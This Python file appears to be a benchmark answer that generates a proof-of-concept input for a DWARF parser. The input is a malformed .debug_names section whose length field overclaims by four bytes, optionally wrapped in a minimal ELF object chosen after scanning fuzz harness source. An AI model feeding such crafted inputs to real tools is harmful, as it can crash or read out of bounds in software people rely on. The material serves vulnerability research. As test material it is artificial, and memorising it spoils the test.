import os
import re
import tarfile
import struct
from dataclasses import dataclass
from typing import List, Optional, Tuple


def _p8(x: int) -> bytes:
    return struct.pack("<B", x & 0xFF)


def _p16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def _align(off: int, a: int) -> int:
    if a <= 1:
        return off
    return (off + (a - 1)) & ~(a - 1)


@dataclass
class _Sec:
    name: str
    shtype: int
    data: bytes
    addralign: int = 1


def _make_debug_names_section_variant_len_bypass() -> bytes:
    # Actual section size is 33 bytes, but unit_length claims 33 bytes after the length field.
    # The section only contains 29 bytes after the length field (header + NUL augmentation).
    unit_length_claim = 33
    version = 5
    padding = 0
    comp_unit_count = 1
    local_type_unit_count = 0
    foreign_type_unit_count = 0
    bucket_count = 0
    name_count = 0
    abbrev_table_size = 0
    augmentation = b"\x00"

    body = b"".join(
        [
            _p16(version),
            _p16(padding),
            _p32(comp_unit_count),
            _p32(local_type_unit_count),
            _p32(foreign_type_unit_count),
            _p32(bucket_count),
            _p32(name_count),
            _p32(abbrev_table_size),
            augmentation,
        ]
    )
    # Ensure actual size == 33
    assert len(body) == 29
    sec = _p32(unit_length_claim) + body
    assert len(sec) == 33
    return sec


def _make_debug_abbrev_minimal() -> bytes:
    # Single 0 byte (no abbrevs)
    return b"\x00"


def _make_debug_info_minimal_dwarf5_cu() -> bytes:
    # DWARF5 CU header (32-bit unit_length):
    # unit_length: bytes after this field
    # version: 5
    # unit_type: DW_UT_compile (0x01)
    # address_size: 8
    # abbrev_offset: 0
    # first abbrev code: 0 (end of CU)
    version = 5
    unit_type = 0x01
    addr_size = 8
    abbrev_offset = 0
    die0 = b"\x00"
    rest = b"".join([_p16(version), _p8(unit_type), _p8(addr_size), _p32(abbrev_offset), die0])
    return _p32(len(rest)) + rest


def _build_elf64_rel_with_sections(sections: List[_Sec]) -> bytes:
    # sections excludes the implicit null section and excludes .shstrtab (we add it first)
    # We'll build section header table immediately after ELF header, and place section data afterwards,
    # with .debug_names last.
    for s in sections:
        if not isinstance(s.data, (bytes, bytearray)):
            raise TypeError("section data must be bytes")

    # Ensure .debug_names is last if present
    names = [s.name for s in sections]
    if ".debug_names" in names and names[-1] != ".debug_names":
        # reorder to make .debug_names last, preserving relative order of others
        dn = [s for s in sections if s.name == ".debug_names"][0]
        rest = [s for s in sections if s.name != ".debug_names"]
        sections = rest + [dn]

    # Build shstrtab
    all_names = [".shstrtab"] + [s.name for s in sections]
    shstr = bytearray(b"\x00")
    name_off = {}
    for nm in all_names:
        name_off[nm] = len(shstr)
        shstr += nm.encode("ascii", "strict") + b"\x00"
    shstrtab = _Sec(".shstrtab", 3, bytes(shstr), 1)

    sec_list = [_Sec("", 0, b"", 0), shstrtab] + sections  # include null
    shnum = len(sec_list)
    shstrndx = 1

    # ELF header
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0, 0]) + b"\x00" * 7  # 16 bytes total
    assert len(e_ident) == 16
    e_type = 1  # ET_REL
    e_machine = 62  # EM_X86_64
    e_version = 1
    e_entry = 0
    e_phoff = 0
    e_shoff = 64
    e_flags = 0
    e_ehsize = 64
    e_phentsize = 0
    e_phnum = 0
    e_shentsize = 64

    ehdr = b"".join(
        [
            e_ident,
            _p16(e_type),
            _p16(e_machine),
            _p32(e_version),
            _p64(e_entry),
            _p64(e_phoff),
            _p64(e_shoff),
            _p32(e_flags),
            _p16(e_ehsize),
            _p16(e_phentsize),
            _p16(e_phnum),
            _p16(e_shentsize),
            _p16(shnum),
            _p16(shstrndx),
        ]
    )
    assert len(ehdr) == 64

    # Compute data offsets
    shdr_table_size = shnum * 64
    data_start = e_shoff + shdr_table_size
    cur = data_start
    offsets_sizes = []
    for idx, sec in enumerate(sec_list):
        if idx == 0:
            offsets_sizes.append((0, 0))
            continue
        a = sec.addralign if sec.addralign and sec.addralign > 0 else 1
        cur = _align(cur, a)
        off = cur
        sz = len(sec.data)
        cur += sz
        offsets_sizes.append((off, sz))

    file_size = cur
    out = bytearray(b"\x00" * file_size)
    out[0:64] = ehdr

    # Write section data
    for idx, sec in enumerate(sec_list):
        if idx == 0:
            continue
        off, sz = offsets_sizes[idx]
        if sz:
            out[off : off + sz] = sec.data

    # Build section headers
    def shdr(sh_name: int, sh_type: int, sh_flags: int, sh_addr: int, sh_offset: int, sh_size: int,
             sh_link: int, sh_info: int, sh_addralign: int, sh_entsize: int) -> bytes:
        return b"".join(
            [
                _p32(sh_name),
                _p32(sh_type),
                _p64(sh_flags),
                _p64(sh_addr),
                _p64(sh_offset),
                _p64(sh_size),
                _p32(sh_link),
                _p32(sh_info),
                _p64(sh_addralign),
                _p64(sh_entsize),
            ]
        )

    shdrs = bytearray()
    for idx, sec in enumerate(sec_list):
        if idx == 0:
            shdrs += shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
            continue
        off, sz = offsets_sizes[idx]
        nmoff = name_off.get(sec.name, 0)
        sht = sec.shtype
        sh_flags = 0
        sh_addr = 0
        sh_link = 0
        sh_info = 0
        sh_addralign = sec.addralign if sec.addralign and sec.addralign > 0 else 1
        sh_entsize = 0
        shdrs += shdr(nmoff, sht, sh_flags, sh_addr, off, sz, sh_link, sh_info, sh_addralign, sh_entsize)
    assert len(shdrs) == shdr_table_size
    out[e_shoff : e_shoff + shdr_table_size] = shdrs

    return bytes(out)


def _iter_source_texts_from_tar(tar_path: str, max_files: int = 2000, max_bytes: int = 2_000_000) -> List[str]:
    texts = []
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            count = 0
            for m in tf:
                if count >= max_files:
                    break
                if not m.isfile():
                    continue
                n = m.name.lower()
                if not (n.endswith(".c") or n.endswith(".cc") or n.endswith(".cpp") or n.endswith(".cxx") or n.endswith(".h") or n.endswith(".hpp")):
                    continue
                if m.size <= 0 or m.size > max_bytes:
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    s = data.decode("utf-8", "ignore")
                except Exception:
                    continue
                texts.append(s)
                count += 1
    except Exception:
        return []
    return texts


def _iter_source_texts_from_dir(dir_path: str, max_files: int = 2000, max_bytes: int = 2_000_000) -> List[str]:
    texts = []
    count = 0
    for root, _, files in os.walk(dir_path):
        for fn in files:
            if count >= max_files:
                return texts
            n = fn.lower()
            if not (n.endswith(".c") or n.endswith(".cc") or n.endswith(".cpp") or n.endswith(".cxx") or n.endswith(".h") or n.endswith(".hpp")):
                continue
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > max_bytes:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            try:
                s = data.decode("utf-8", "ignore")
            except Exception:
                continue
            texts.append(s)
            count += 1
    return texts


def _detect_input_mode(src_path: str) -> str:
    # Returns "ELF" or "RAW"
    texts: List[str]
    if os.path.isdir(src_path):
        texts = _iter_source_texts_from_dir(src_path)
    else:
        texts = _iter_source_texts_from_tar(src_path)

    fuzz_texts = []
    for t in texts:
        if "LLVMFuzzerTestOneInput" in t or "FuzzerTestOneInput" in t:
            fuzz_texts.append(t)
        elif "oss-fuzz" in t.lower() and ("fuzz" in t.lower() or "fuzzer" in t.lower()):
            fuzz_texts.append(t)

    joined = "\n".join(fuzz_texts) if fuzz_texts else "\n".join(texts[:50])

    # Heuristics for RAW_SECTION mode: explicit object access interface with section data from input
    raw_signals = [
        "Dwarf_Obj_Access_Interface",
        "dwarf_object_init_b",
        "get_section_info",
        "get_section_count",
        "section_data",
        ".debug_names",
    ]
    elf_signals = [
        "dwarf_init",
        "dwarf_init_b",
        "dwarf_elf_init",
        "Elf64_Ehdr",
        "libelf",
        "elf_begin",
    ]

    raw_score = sum(1 for s in raw_signals if s in joined)
    elf_score = sum(1 for s in elf_signals if s in joined)

    # If explicit section access interface is present, prefer RAW
    if raw_score >= 3 and "get_section_info" in joined and ".debug_names" in joined:
        return "RAW"
    if elf_score >= 2 and raw_score < 3:
        return "ELF"
    return "ELF"


class Solution:
    def solve(self, src_path: str) -> bytes:
        mode = _detect_input_mode(src_path)

        debug_names = _make_debug_names_section_variant_len_bypass()

        if mode == "RAW":
            return debug_names

        debug_abbrev = _make_debug_abbrev_minimal()
        debug_info = _make_debug_info_minimal_dwarf5_cu()

        elf = _build_elf64_rel_with_sections(
            [
                _Sec(".debug_abbrev", 1, debug_abbrev, 1),
                _Sec(".debug_info", 1, debug_info, 1),
                _Sec(".debug_names", 1, debug_names, 1),
            ]
        )
        return elf